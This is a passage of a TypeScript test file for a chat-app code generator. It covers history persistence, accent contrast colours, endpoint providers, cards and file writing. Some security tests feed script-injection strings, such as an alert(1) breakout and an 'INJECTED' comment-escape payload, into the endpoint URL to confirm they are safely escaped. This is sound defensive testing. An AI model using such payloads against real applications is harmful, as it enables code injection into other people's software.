  it('history local: a stored value that parses but is not an array is ignored, not handed to setMessages', () => {
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'local' } } })),
      'src/App.tsx',
    );
    expect(app).toContain('Array.isArray(parsed)');
    // The isArray gate must sit BETWEEN the parse and setMessages, not after.
    const parseIdx = app.indexOf('JSON.parse(saved)');
    const isArrayIdx = app.indexOf('Array.isArray(parsed)');
    const setMessagesIdx = app.indexOf('chat.setMessages(() => parsed');
    expect(parseIdx).toBeGreaterThan(-1);
    expect(isArrayIdx).toBeGreaterThan(parseIdx);
    expect(setMessagesIdx).toBeGreaterThan(isArrayIdx);
  });

  it('history endpoint: the GET hydrate is try/catch\'d, decides loudly, and flips hydrated on BOTH success and failure (a failed load must not permanently disable future PUTs)', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    // The GET chain is wrapped, not fire-and-forget like the old version.
    expect(app).toMatch(/try\s*{[^}]*fetch\(/s);
    expect(app).toContain('console.error');
    // hydrated is set in a `finally` (or equivalent unconditional path) so a
    // rejected fetch / non-OK response still unblocks the write-back effect —
    // "start fresh, keep saving", not "never save again".
    expect(app).toContain('finally');
    expect(app).toContain('hydrated = true;');
    // Only ONE `hydrated = true` assignment inside the async load IIFE would
    // leave the failure path unhandled if it lived only in the try branch —
    // pin that the assignment is inside `finally`, not `try`.
    const finallyIdx = app.indexOf('finally');
    const hydratedTrueAfterFinally = app.indexOf('hydrated = true;', finallyIdx);
    expect(hydratedTrueAfterFinally).toBeGreaterThan(finallyIdx);
  });

  it('history endpoint: a well-formed non-array GET body is rejected before reaching setMessages', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('Array.isArray(saved)');
    expect(app).toContain('console.warn');
  });

  it('history endpoint: the PUT write-back is guarded with .catch and decides loudly on failure (fire-and-forget is not silent)', () => {
    const app = file(
      generateProject(
        construct({ capabilities: { history: { persistence: 'endpoint', url: '/api/thread' } } }),
      ),
      'src/App.tsx',
    );
    expect(app).toMatch(/method: 'PUT'[\s\S]*\.catch\(/);
    expect(app).toMatch(/\.catch\([\s\S]*console\.error/);
  });

  it('a hostile endpoint url cannot break out of the emitted string literal (JSON.stringify, not string concatenation)', () => {
    const hostile = "'); alert(1); ('";
    const app = file(
      generateProject(construct({ capabilities: { history: { persistence: 'endpoint', url: hostile } } })),
      'src/App.tsx',
    );
    expect(app).toContain(`fetch(${JSON.stringify(hostile)})`);
    expect(app).not.toContain(`fetch('${hostile}')`);
  });
});

describe('accent contrast (paired --kai-color-primary-foreground)', () => {
  it('resolveContrastForeground: a light accent (yellow) picks black; #e91e63 picks white', () => {
    // Worked numbers (see the doc comment on resolveContrastForeground for
    // why this is a luminance-distance comparison, not the WCAG contrast-
    // RATIO formula): yellow #ffff00 has relative luminance ≈0.928 (>0.5 —
    // closer to white, so black text sits on it); #e91e63 has relative
    // luminance ≈0.192 (<=0.5 — closer to black, so white text sits on it).
    expect(resolveContrastForeground('#ffff00')).toBe('#000000');
    expect(resolveContrastForeground('#e91e63')).toBe('#ffffff');
  });

  it('resolveContrastForeground: parses rgb()/hsl() numeric forms the same way as hex', () => {
    expect(resolveContrastForeground('rgb(255, 255, 0)')).toBe('#000000');
    expect(resolveContrastForeground('hsl(0, 76%, 52%)')).toEqual(expect.stringMatching(/^#(000000|ffffff)$/));
  });

  it('resolveContrastForeground: does not guess at named colors, var(), or other exotic syntax', () => {
    expect(resolveContrastForeground('var(--brand)')).toBeNull();
    expect(resolveContrastForeground('yellow')).toBeNull();
    expect(resolveContrastForeground('color-mix(in oklab, red, blue)')).toBeNull();
  });

  it('a parseable accent emits the base --kai-color-primary-foreground declaration before the @supports override, both at :host', () => {
    const element = file(generateProject(construct({ theme: { accent: '#e91e63', mode: 'system' } })), 'src/element.tsx');
    expect(element).toContain(':host { --kai-color-primary-foreground: #ffffff; }');
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // Ordering: the base declaration comes BEFORE (outside) the @supports
    // block, so ordinary cascade order lets the native answer win where the
    // browser supports it, and lets the codegen-computed floor stand where it
    // doesn't — no !important needed either way.
    const baseIdx = element.indexOf('--kai-color-primary-foreground: #ffffff');
    const supportsIdx = element.indexOf('@supports');
    expect(baseIdx).toBeGreaterThan(-1);
    expect(supportsIdx).toBeGreaterThan(baseIdx);
  });

  it('an unparseable accent skips the base foreground declaration, still emits @supports, and leaves a softened NOTICE', () => {
    const files = generateProject(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    const element = file(files, 'src/element.tsx');
    expect(element).not.toContain('--kai-color-primary-foreground: #ffffff');
    expect(element).not.toContain('--kai-color-primary-foreground: #000000');
    // @supports still covers it natively where the browser can resolve
    // contrast-color() itself, accent included.
    expect(element).toContain('@supports (color: contrast-color(red))');
    expect(element).toContain('contrast-color(var(--kai-color-primary))');
    // NOTICE, softened: the theme default stands only in browsers that can't
    // do contrast-color() — not an unconditional claim.
    expect(element).toMatch(/NOTICE:.*not parseable for contrast/);
    expect(element).toMatch(/without CSS contrast-color\(\) support/);
  });

  it('accentContrastNotice: null when there is no accent or the accent parses; one line when it does not', () => {
    expect(accentContrastNotice(construct())).toBeNull();
    expect(accentContrastNotice(construct({ theme: { accent: '#e91e63', mode: 'system' } }))).toBeNull();
    const notice = accentContrastNotice(construct({ theme: { accent: 'var(--brand)', mode: 'system' } }));
    expect(notice).toMatch(/^accent 'var\(--brand\)' not parseable for contrast/);
    expect(notice).toMatch(/without CSS contrast-color\(\) support/);
  });
});

describe('endpoint provider', () => {
  const endpoint = (wire: 'openai' | 'anthropic', url = '/api/chat') =>
    construct({ provider: { mode: 'endpoint', url, wire } });

  it('openai wire: fetch to the declared URL, readOpenAIStream + toOpenAIMessages', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    // JSON.stringify(url) at the interpolation site (see the security test
    // below) — double-quoted, not the brief's hand-typed single-quote form.
    expect(app).toContain(`fetch(${JSON.stringify('/api/chat')}`);
    expect(app).toContain('readOpenAIStream(');
    expect(app).toContain('toOpenAIMessages(');
    expect(app).not.toContain('createMockResponder');
  });

  it('anthropic wire: the anthropic reader/encoder pair', () => {
    const app = file(generateProject(endpoint('anthropic')), 'src/App.tsx');
    expect(app).toContain('readAnthropicStream(');
    expect(app).toContain('toAnthropicMessages(');
  });

  it('no hand-rolled SSE and no key material, ever', () => {
    for (const wire of ['openai', 'anthropic'] as const) {
      const app = file(generateProject(endpoint(wire)), 'src/App.tsx');
      expect(app).not.toMatch(/text\/event-stream|EventSource|api[_-]?key|Authorization/i);
    }
  });

  it('mock stays mock: no fetch, no readOpenAIStream reader import name collision with the wire encoders', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain('createMockResponder');
    expect(app).not.toContain('toOpenAIMessages(');
    expect(app).not.toContain('toAnthropicMessages(');
  });

  it('url is JSON-stringified at the fetch call site — a quote/backtick/script payload cannot break out into new JS', () => {
    // Mirrors the accent-escaping precedent in emitElement: provider.url is an
    // UNCONSTRAINED z.string(), so it must be embedded the same safe way.
    const hostile = `'; alert(1); const x='`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    expect(app).toContain(`fetch(${JSON.stringify(hostile)}`);
    // The raw payload must never appear un-escaped as its own token boundary.
    expect(app).not.toContain(`fetch('${hostile}'`);
  });

  it('url is never embedded in a // comment — a U+2028/U+2029 line-separator payload cannot end the comment and expose executable text', () => {
    // U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) are valid JS
    // line terminators that end a `//` comment, but are NOT touched by
    // commentSafe's \r\n strip — so hand-rolling comment-escaping for
    // untrusted text is a trap. The real fix is structural: the url is never
    // interpolated into a comment at all, only into the fetch() call via
    // JSON.stringify (a real string literal, immune to this class of bug).
    const hostile = `http://x console.log("INJECTED");//`;
    const app = file(generateProject(endpoint('openai', hostile)), 'src/App.tsx');
    const jsonLiteral = JSON.stringify(hostile);
    expect(app).toContain(`fetch(${jsonLiteral}`);
    // Strip the one legitimate occurrence (the JSON string literal on the
    // fetch() line) and confirm the payload appears nowhere else — in
    // particular not bare in a `//` comment where it could break out.
    const withoutTheOneLiteral = app.split(jsonLiteral).join('');
    expect(withoutTheOneLiteral).not.toContain('INJECTED');
    expect(withoutTheOneLiteral).not.toContain(' ');
  });

  it('endpoint branch: a throwing fetch/reader surfaces via stream.abort — no unhandled rejection, no stuck loading', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*fetch\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });

  it('endpoint branch: a non-2xx response is thrown before parsing, not silently rendered as an empty reply', () => {
    const app = file(generateProject(endpoint('openai')), 'src/App.tsx');
    expect(app).toMatch(/if \(!response\.ok\) throw new Error/);
  });

  it('mock branch: the same throw -> stream.abort discipline applies (a malformed scripted turn must not hang loading forever either)', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toMatch(/try\s*\{[\s\S]*readOpenAIStream\(/);
    expect(app).toMatch(/catch \(err\) \{\s*stream\.abort\(/);
  });
});

describe('cards', () => {
  it('renders card parts via CardRenderer and projects tools via @kitn.ai/ui/schemas', () => {
    const files = generateProject(
      construct({
        cards: [{ name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } }],
      }),
    );
    const app = file(files, 'src/App.tsx');
    expect(app).toContain('CardRenderer');
    expect(app).toContain("part.type === 'card'");
    expect(app).toContain("from '@kitn.ai/ui/schemas'");
    expect(file(files, 'src/cards.ts')).toContain('refund_approval');
  });

  it('no cards, no card code and no src/cards.ts', () => {
    const files = generateProject(construct());
    expect(files.some((f) => f.path === 'src/cards.ts')).toBe(false);
    expect(file(files, 'src/App.tsx')).not.toContain('CardRenderer');
  });

  it('src/cards.ts emits the registry verbatim, keyed by card name, deterministic', () => {
    const files = generateProject(
      construct({
        cards: [{ name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } }],
      }),
    );
    const cardsFile = file(files, 'src/cards.ts');
    expect(cardsFile).toContain('export const cards = {');
    expect(cardsFile).toContain('refund_approval:');
    expect(cardsFile).toContain('"amount"');
    expect(cardsFile).toMatch(/}\s*as const;/);
  });

  it('App.tsx imports the registry and cardFromToolCall', () => {
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain("import { cards } from './cards';");
    expect(app).toContain('cardFromToolCall');
  });

  it('does NOT register cardSchemas on ChatThread — a card\'s data is its own declared schema, not values shaped like it, so validating it against itself would always fail hard', () => {
    // Live-caught regression: registering `cardSchemas={cards}` here made
    // CardRenderer validate `cards[name]` (a JSON Schema / FormDefinition) AGAINST
    // `cards[name]` as if it were VALUES — e.g. "(root).amount: required" on a
    // FormDefinition that has no top-level `amount` key at all — which is a HARD
    // failure in card-renderer.tsx and renders CardFallback instead of the form
    // every single time. cardTypes (the renderer map) is unaffected and stays.
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).not.toContain('cardSchemas={cards}');
    expect(app).not.toMatch(/\bcardSchemas=\{/);
  });

  it('every declared card name routes to the kit\'s own form renderer, not the fallback — cardTypes registered on ChatThread', () => {
    // SUPERVISOR RULING: a construct card must render as a real schema-driven
    // form (BUILTIN_CARD_COMPONENTS.form), never as CardFallback. cardSchemas
    // alone is validation-only and does not select a renderer — CardRenderer
    // picks the component from `types` (ChatThread's `cardTypes` prop), so
    // that map has to be registered too, keyed by the same card names.
    const app = file(
      generateProject(
        construct({
          cards: [
            { name: 'refund_approval', schema: { type: 'object', properties: { amount: { type: 'number' } } } },
          ],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain("BUILTIN_CARD_COMPONENTS");
    expect(app).toMatch(/from '@kitn\.ai\/ui\/solid';[\s\S]*BUILTIN_CARD_COMPONENTS/);
    expect(app).toContain('BUILTIN_CARD_COMPONENTS.form');
    expect(app).toContain('cardTypes={cardTypes}');
    // The map is DERIVED from the registry's own keys, not hand-listed, so a
    // second card in the construct is covered without a codegen change.
    expect(app).toMatch(/Object\.keys\(cards\)\.map\(\s*\(name\)\s*=>\s*\[name,\s*BUILTIN_CARD_COMPONENTS\.form\]/);
  });

  it('a card tool call renders with the DECLARED schema (with the model\'s args merged onto field defaults, CD-1/Task 19g) as its data, never the raw call arguments verbatim', () => {
    // The construct author's fields are still the vocabulary the form draws —
    // the model's tool-call args only ever seed FormField.default, never
    // replace the schema itself.
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain('cards[card.type as keyof typeof cards]');
    expect(app).not.toContain('stream.addCard(card)');
  });

  it('endpoint + openai wire: the fetch body carries tools: toOpenAITools(cards)', () => {
    const app = file(
      generateProject(
        construct({
          provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' },
          cards: [{ name: 'refund_approval', schema: { type: 'object' } }],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('toOpenAITools(cards)');
    expect(app).toMatch(/tools:\s*toOpenAITools\(cards\)/);
  });

  it('endpoint + anthropic wire: the fetch body carries tools: toAnthropicTools(cards)', () => {
    const app = file(
      generateProject(
        construct({
          provider: { mode: 'endpoint', url: '/api/chat', wire: 'anthropic' },
          cards: [{ name: 'refund_approval', schema: { type: 'object' } }],
        }),
      ),
      'src/App.tsx',
    );
    expect(app).toContain('toAnthropicTools(cards)');
    expect(app).not.toContain('toOpenAITools');
  });

  it('no cards: no tools field on the endpoint fetch body, no schemas import', () => {
    const app = file(
      generateProject(construct({ provider: { mode: 'endpoint', url: '/api/chat', wire: 'openai' } })),
      'src/App.tsx',
    );
    expect(app).not.toContain('tools:');
    expect(app).not.toContain("from '@kitn.ai/ui/schemas'");
  });

  it('mock provider + cards: a settled tool call is converted to a card via cardFromToolCall/addCard', () => {
    const app = file(
      generateProject(construct({ cards: [{ name: 'refund_approval', schema: { type: 'object' } }] })),
      'src/App.tsx',
    );
    expect(app).toContain('cardFromToolCall(');
    expect(app).toContain('stream.addCard(');
    // Settled before stream.done(), reading the just-written tool part back off
    // chat.messages() (the mutator API has no getter of its own).
    const cardIdx = app.indexOf('stream.addCard(');
    const doneIdx = app.indexOf('stream.done();');
    expect(cardIdx).toBeGreaterThan(-1);
    expect(doneIdx).toBeGreaterThan(cardIdx);
  });
});

describe('CD-1: model tool-call args merge into FormField defaults (Task 19g)', () => {
  const cardConstruct = () =>
    construct({
      cards: [
        {
          name: 'refund_approval',
          schema: {
            type: 'object',
            properties: {
              amount: { type: 'number', title: 'Amount' },
              reason: { type: 'string', title: 'Reason' },
            },
          },
        },
      ],
    });

  it('emits a shallow-merge helper and applies it before addCard', () => {
    const app = file(generateProject(cardConstruct()), 'src/App.tsx');
    expect(app).toContain('function mergeToolArgsIntoFormDefaults');
    expect(app).toMatch(/stream\.addCard\(\{ \.\.\.card, data: merge/);
    // The wholesale replacement this task removes must be GONE, not just
    // supplemented — leaving both would silently re-introduce the drop.
    expect(app).not.toContain('data: cards[card.type as keyof typeof cards] }');
  });

  it('only top-level keys present in the model args get a default; declared field shape (title/type) is untouched', () => {
    const app = file(generateProject(cardConstruct()), 'src/App.tsx');
    expect(app).toContain('properties: { ...schema.properties');
  });
});

/**
 * `mergeToolArgsIntoFormDefaults` exists TWICE (review round 1, Task 19g fix):
 * a real, exported TS function in this module (used directly by tests, e.g.
 * codegen-cards.render.test.tsx) and an EMITTED-STRING twin inside
 * `emitCardsImport`'s return value that App.tsx gets verbatim — kept in sync
 * by hand, not by import, same as every other piece of construct-glue logic
 * this file emits. `verify:construct` proves the twin COMPILES under a
 * real cell's strict tsconfig, but nothing proved it BEHAVES the same as the
 * real function — a future edit to one (adding recursion, changing
 * precedence) could drift silently.
 *
 * This describe block extracts the twin's actual source out of a generated
 * App.tsx, strips its TS type annotations with the real TypeScript compiler
 * (not hand-written string surgery, and NOT `.toString()` on the real
 * function — that would lose the emitted copy's own annotations, which is
 * exactly what the strict per-cell tsc pass needs and what this guard must
 * exercise), and runs it through `new Function` so it is executed, not just
 * pattern-matched. The same case table then runs against both the real
 * function and the extracted twin and asserts identical outputs — so any
 * behavioral drift between the two turns this test red.
 */
describe('CD-1 drift guard: the real mergeToolArgsIntoFormDefaults and its emitted twin behave identically', () => {
  type MergeFn = (
    schema: Record<string, unknown>,
    args: Record<string, unknown>,
  ) => Record<string, unknown>;

  /** Pull the emitted twin's source out of a generated App.tsx, strip its TS
   *  annotations via the real TypeScript compiler, and return it as a
   *  callable function — the twin, actually running, not just grepped. */
  function extractEmittedTwin(appSource: string): MergeFn {
    // Non-greedy up to the function's own closing brace on its own line at
    // column 0 — every brace INSIDE the function body is indented, so this
    // uniquely bounds the declaration regardless of what code follows it in
    // the concatenated App.tsx (this function is not always the last thing
    // emitCardsImport's own template contributes once other emit* functions'
    // output is appended after it).
    const match = appSource.match(/function mergeToolArgsIntoFormDefaults\([\s\S]*?\n\}\n/);
    if (!match) {
      throw new Error('mergeToolArgsIntoFormDefaults not found in the emitted App.tsx — extraction regex is stale.');
    }
    const { outputText } = ts.transpileModule(match[0], {
      compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2020 },
    });
    // eslint-disable-next-line @typescript-eslint/no-implied-eval -- deliberate: executing the EMITTED twin's own stripped source is the point of this guard.
    const factory = new Function(`${outputText}\nreturn mergeToolArgsIntoFormDefaults;`);
    return factory() as MergeFn;
  }

  const cardConstruct = () =>
    construct({
      cards: [
        {
          name: 'refund_approval',
          schema: {
            type: 'object',
            properties: {
              amount: { type: 'number', title: 'Amount' },
              reason: { type: 'string', title: 'Reason' },
            },
          },
        },
      ],
    });

  const app = () => file(generateProject(cardConstruct()), 'src/App.tsx');

  const CASES: Array<{ name: string; schema: Record<string, unknown>; args: Record<string, unknown> }> = [
    {
      name: 'merges a known top-level key onto default',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: { amount: 50 },
    },
    {
      name: 'ignores a key the schema does not declare',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: { amount: 50, bogus_field: 'nope' },
    },
    {
      name: 'a model arg overrides an explicit static default (precedence)',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount', default: 10 } } },
      args: { amount: 75 },
    },
    {
      name: 'x-kai-mask/x-kai-format hints on the field survive the merge untouched',
      schema: {
        type: 'object',
        properties: {
          ticket: {
            type: 'string',
            title: 'Change ticket',
            pattern: '^CHG-[0-9]{4}$',
            'x-kai-format': 'custom',
            'x-kai-mask': 'CHG-####',
            'x-kai-mask-guide': 'CHG-####',
          },
        },
      },
      args: { ticket: 'CHG-4821' },
    },
    {
      name: 'no properties on the schema at all — returned unchanged',
      schema: { type: 'object' },
      args: { amount: 1 },
    },
    {
      name: 'empty args — no field gets a new default',
      schema: { type: 'object', properties: { amount: { type: 'number', title: 'Amount' } } },
      args: {},
    },
  ];

  it('the extraction regex actually finds the twin (sanity — fails loudly if codegen.ts moves it)', () => {
    expect(() => extractEmittedTwin(app())).not.toThrow();
  });

  for (const { name, schema, args } of CASES) {
    it(`identical output: ${name}`, () => {
      const twin = extractEmittedTwin(app());
      const fromReal = mergeToolArgsIntoFormDefaults(schema, args);
      const fromTwin = twin(schema, args);
      expect(fromTwin).toEqual(fromReal);
    });
  }
});

describe('writeProject', () => {
  it('writes files and prunes stale ones tracked via .kai-manifest.json', () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const projectA = generateProject(construct());
    writeProject(projectA, dir);
    for (const f of projectA) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const projectB = projectA.filter((f) => f.path !== 'index.html');
    writeProject(projectB, dir);

    expect(existsSync(join(dir, 'index.html'))).toBe(false);
    for (const f of projectB) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(projectB.map((f) => f.path).sort());
  });
});
